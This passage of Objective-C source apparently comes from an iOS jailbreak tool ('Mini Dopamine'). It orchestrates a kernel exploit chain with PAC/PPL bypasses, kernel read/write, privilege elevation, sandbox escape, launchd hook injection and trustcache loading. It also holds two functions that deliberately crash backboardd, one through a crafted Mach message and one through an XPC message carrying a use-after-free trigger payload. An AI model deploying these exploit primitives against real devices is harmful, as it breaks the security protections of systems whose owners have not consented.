            jbctlPath = [NSString stringWithUTF8String:jbctl];
        }
        if (!jbctlPath) {
            for (NSString *root in [self miniRootPaths]) {
                NSString *candidate = [root stringByAppendingPathComponent:@"basebin/jbctl"];
                if (access(candidate.fileSystemRepresentation, X_OK) == 0) {
                    jbctlPath = candidate;
                    break;
                }
            }
        }
        if (jbctlPath) {
            int r = exec_cmd(jbctlPath.fileSystemRepresentation, "internal", "fakelib", "unmount", NULL);
            [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"fakelib unmount: %d", r]];
        } else {
            [[DOUIManager sharedInstance] sendLog:@"fakelib mounted but jbctl missing, skip unmount"];
        }
    }

    NSError *lastError = nil;
    NSFileManager *fm = [NSFileManager defaultManager];
    for (NSString *root in [self miniRootPaths]) {
        if (![fm fileExistsAtPath:root]) continue;
        NSError *error = nil;
        if ([fm removeItemAtPath:root error:&error]) {
            [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"deleted %@", root]];
        } else {
            [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"delete failed %@: %@", root, error.localizedDescription]];
            lastError = error;
        }
    }

    if ([fm fileExistsAtPath:@"/var/jb"]) {
        NSError *error = nil;
        if ([fm removeItemAtPath:@"/var/jb" error:&error]) {
            [[DOUIManager sharedInstance] sendLog:@"deleted /var/jb"];
        } else {
            [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"delete /var/jb failed: %@", error.localizedDescription]];
            if (!lastError) lastError = error;
        }
    }

    return lastError;
}

- (void)runMiniWithError:(NSError **)errOut
{
    *errOut = nil;

    struct utsname systemInfo;
    uname(&systemInfo);
    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"Starting Mini Dopamine (%s, %@)", systemInfo.machine, NSProcessInfo.processInfo.operatingSystemVersionString]];

    DOExploit *kernelExploit = [DOExploitManager sharedManager].selectedKernelExploit;
    if (!kernelExploit) {
        *errOut = [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"ClearSword is not in the app bundle"}];
        return;
    }
    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"Kernel exploit: %@ (%@)", kernelExploit.name, kernelExploit.identifier]];
    if (!kernelExploit.isSupported) {
        [[DOUIManager sharedInstance] sendLog:@"Warning: ClearSword is not marked supported on this build, continuing anyway"];
    }

    DOExploit *pacBypass = [DOExploitManager sharedManager].selectedPACBypass;
    if ([[DOEnvironmentManager sharedManager] isPACBypassRequired]) {
        if (pacBypass) {
            [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"PAC bypass: %@ (%@)", pacBypass.name, pacBypass.identifier]];
        }
        else {
            [[DOUIManager sharedInstance] sendLog:@"Warning: PAC bypass is required but was not found"];
        }
    }

    DOExploit *pplBypass = [DOExploitManager sharedManager].selectedPPLBypass;
    if ([[DOEnvironmentManager sharedManager] isPPLBypassRequired]) {
        NSString *kind = [DOEnvironmentManager sharedManager].isSPTM ? @"SPTM" : @"PPL";
        if (pplBypass) {
            [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"%@ bypass: %@ (%@)", kind, pplBypass.name, pplBypass.identifier]];
        }
        else {
            [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"Warning: %@ bypass is required but was not found", kind]];
        }
    }

    *errOut = [self gatherSystemInformation];
    if (*errOut) return;

    *errOut = [self doExploitation];
    if (*errOut) {
        [self cleanUpExploits];
        return;
    }

    [[DOUIManager sharedInstance] sendLog:@"Building Phys R/W Primitive"];
    *errOut = [self buildPhysRWPrimitive];
    if (*errOut) {
        [self cleanUpExploits];
        return;
    }

    [[DOUIManager sharedInstance] sendLog:@"Cleaning Up Exploits"];
    *errOut = [self cleanUpExploits];
    if (*errOut) return;

    [[DOUIManager sharedInstance] sendLog:@"Elevating Privileges"];
    *errOut = [self elevatePrivileges];
    if (*errOut) return;

    uint64_t proc = proc_self();
    uint32_t kpid = kread32(proc + koffsetof(proc, pid));
    uint64_t launchd = proc_find(1);
    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"KRW ok: self proc=%#llx pid=%u uid=%d gid=%d", proc, kpid, getuid(), getgid()]];
    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"proc_find(1)=%#llx", launchd]];

    NSError *fsError = nil;
    NSArray *varEntries = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var" error:&fsError];
    if (fsError) {
        [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"/var not readable: %@", fsError.localizedDescription]];
    } else {
        [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"unsandbox ok: /var entries=%lu", (unsigned long)varEntries.count]];
    }

    NSString *bundleRoot = @"/var/containers/Bundle/Application";
    NSArray *appUUIDs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:bundleRoot error:&fsError];
    if (fsError) {
        [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"App bundle dir not readable: %@", fsError.localizedDescription]];
    } else {
        [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"App bundle dir entries=%lu", (unsigned long)appUUIDs.count]];
        NSUInteger logged = 0;
        for (NSString *uuid in appUUIDs) {
            NSString *uuidPath = [bundleRoot stringByAppendingPathComponent:uuid];
            NSArray *items = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:uuidPath error:nil];
            for (NSString *item in items) {
                if (![item.pathExtension isEqualToString:@"app"]) continue;
                NSDictionary *info = [NSDictionary dictionaryWithContentsOfFile:[[uuidPath stringByAppendingPathComponent:item] stringByAppendingPathComponent:@"Info.plist"]];
                NSString *bundleId = info[@"CFBundleIdentifier"];
                if (!bundleId) continue;
                [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"app: %@", bundleId]];
                if (++logged >= 8) break;
            }
            if (logged >= 8) break;
        }
    }

    [[DOUIManager sharedInstance] sendLog:@"Preparing jailbreak root"];
    *errOut = [self ensureMiniJailbreakRoot];
    if (*errOut) return;

    [[DOUIManager sharedInstance] sendLog:@"Extracting BaseBin"];
    *errOut = [self prepareMiniBasebin];
    if (*errOut) return;

    [[DOUIManager sharedInstance] sendLog:@"Loading BaseBin trustcache"];
    *errOut = [self loadBasebinTrustcache];
    if (*errOut) return;

    [[DOUIManager sharedInstance] sendLog:@"Injecting launchdhook"];
    *errOut = [self injectLaunchdHook];
    if (*errOut) return;

    [[DOUIManager sharedInstance] sendLog:@"Applying fakelib bind mount"];
    *errOut = [self createFakeLib];
    if (*errOut) return;

    *errOut = [self rebootUserspace];
}

- (IOSurfaceRef)allocatePurpleGfxMemWithSize:(size_t)size
{
    NSDictionary *surfaceProperties = @{
        @"IOSurfaceMemoryRegion": @"PurpleGfxMem",
        @"IOSurfaceAllocSize": @(size),
    };
    return IOSurfaceCreate((__bridge CFDictionaryRef)surfaceProperties);
}

- (BOOL)surfaceIsContiguous:(IOSurfaceRef)surface
{
    vm_address_t mem_addr = (vm_address_t)IOSurfaceGetBaseAddress(surface);
    vm_size_t mem_size = (vm_size_t)IOSurfaceGetAllocSize(surface);
    vm_region_submap_short_info_data_64_t info = {0};
    uint32_t count = VM_REGION_SUBMAP_SHORT_INFO_COUNT_64;
    natural_t depth = 9999999;
    kern_return_t kr = vm_region_recurse_64(mach_task_self(), &mem_addr, &mem_size, &depth, (vm_region_recurse_info_t)&info, &count);
    return (kr == 0 && info.share_mode == SM_EMPTY && info.object_id != 0);
}

- (BOOL)contiguousMappingWorks
{
    IOSurfaceRef surface = [self allocatePurpleGfxMemWithSize:0x8000];
    if (surface == NULL) return false;
    BOOL contiguous = [self surfaceIsContiguous:surface];
    CFRelease(surface);
    return contiguous;
}

- (BOOL)contiguousMappingWorkaroundNeeded
{
    DOExploit *kernelExploit = [DOExploitManager sharedManager].selectedKernelExploit;
    if ([kernelExploit hasRequirement:@"contiguousMapping"]) {
        return ![self contiguousMappingWorks];
    }
    return NO;
}

- (int)crashBackboardd
{
#pragma pack(push, 4)
    typedef struct {
        mach_msg_header_t header;
        mach_msg_body_t body;
        mach_msg_ool_descriptor_t archive;
        NDR_record_t ndr;
        mach_msg_type_number_t archiveLength;
    } Request;
#pragma pack(pop)

    kern_return_t bootstrap_look_up(mach_port_t, const char *, mach_port_t *);

    NSData *archive = [NSKeyedArchiver archivedDataWithRootObject:@[ @[] ] requiringSecureCoding:YES error:nil];
    mach_port_t bootstrap = MACH_PORT_NULL;
    mach_port_t service = MACH_PORT_NULL;

    if (!archive ||
        task_get_bootstrap_port(mach_task_self(), &bootstrap) != KERN_SUCCESS ||
        bootstrap_look_up(bootstrap, "com.apple.backboard.hid.services", &service) != KERN_SUCCESS) {
        return -1;
    }

    Request request = {0};
    request.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    request.header.msgh_size = sizeof(request);
    request.header.msgh_remote_port = service;
    request.header.msgh_id = 6000032;
    request.body.msgh_descriptor_count = 1;
    request.archive.address = (void *)archive.bytes;
    request.archive.size = (mach_msg_size_t)archive.length;
    request.archive.copy = MACH_MSG_VIRTUAL_COPY;
    request.archive.type = MACH_MSG_OOL_DESCRIPTOR;
    request.ndr = NDR_record;
    request.archiveLength = (mach_msg_type_number_t)archive.length;

    (void)mach_msg(&request.header, MACH_SEND_MSG | MACH_SEND_TIMEOUT, request.header.msgh_size, 0, MACH_PORT_NULL, 1000, MACH_PORT_NULL);
    mach_port_deallocate(mach_task_self(), service);
    return 0;
}

- (int)crashBackboardd_15
{
    xpc_connection_t (*haxx_xpc_connection_create_mach_service)(const char *, dispatch_queue_t, uint64_t) = dlsym(RTLD_DEFAULT, "xpc_connection_create_mach_service");
    if (!haxx_xpc_connection_create_mach_service) return -1;
    xpc_connection_t client = haxx_xpc_connection_create_mach_service("com.apple.backboard.TouchDeliveryPolicyServer", NULL, 0);
    xpc_connection_set_event_handler(client, ^(xpc_object_t event) {});
    xpc_connection_resume(client);
    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
    uint8_t root[1024] = {0};
    memcpy(root, "bplist17", strlen("bplist17"));
    xpc_dictionary_set_data(message, "root", root, 1024);
    xpc_dictionary_set_uint64(message, "proxynum", 1);
    xpc_dictionary_set_uint64(message, "inv", 1);
    uint8_t uaf_xpc[1024];
    memset(uaf_xpc, 0x41, 1024);
    xpc_dictionary_set_value(message, "ool", xpc_data_create(uaf_xpc, 1024));
    xpc_connection_send_message_with_reply_sync(client, message);
    return 0;
}

- (void)applyContiguousMappingWorkaround
{
    if (@available(iOS 16.0, *)) {
        [self crashBackboardd];
    } else {
        [self crashBackboardd_15];
    }

    IOSurfaceRef surface = NULL;
    do {
        if (surface) {
            CFRelease(surface);
            surface = NULL;
            usleep(50);
        }
        surface = [self allocatePurpleGfxMemWithSize:0x8000];
    } while (![self surfaceIsContiguous:surface]);

    printf("Got contiguous mapping surface %p\n", surface);
    mach_port_t surfacePort = IOSurfaceCreateMachPort(surface);
    kern_return_t kr = clock_alarm_preserve_port(surfacePort, 20);
    mach_port_mod_refs(mach_task_self(), surfacePort, MACH_PORT_RIGHT_SEND, -1);
    CFRelease(surface);
    printf("preserved port? %d\n", kr);
}

@end
